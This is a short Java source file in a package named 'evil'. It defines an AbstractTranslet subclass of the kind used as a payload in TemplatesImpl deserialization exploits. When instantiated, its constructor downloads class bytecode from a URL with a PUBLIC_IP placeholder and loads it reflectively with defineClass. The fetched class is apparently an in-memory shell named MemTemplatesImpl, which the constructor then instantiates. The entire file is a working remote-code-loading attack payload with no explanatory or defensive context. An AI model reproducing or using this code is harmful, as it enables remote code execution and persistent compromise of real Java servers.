package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.net.*;

public class ProxyTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public static byte[] downloadUsingStream(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        java.io.BufferedInputStream bis = new java.io.BufferedInputStream(url.openStream());
        byte[] classBytecode = new byte[bis.available()];
        bis.read(classBytecode);
        bis.close();
        return classBytecode;
    }
    public static Class loader(byte[] bytes) throws Exception {
        URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);

        return (Class) method.invoke(classLoader, new Object[]{bytes, 0, bytes.length});
    }

    public ProxyTemplatesImpl() throws Exception {
        super();
        String callback = "http://front:5000/http://PUBLIC_IP:8082/proxy/MemTemplatesImpl";
        byte[] memBytecode = downloadUsingStream(callback);
        loader(memBytecode).newInstance();
    }
}
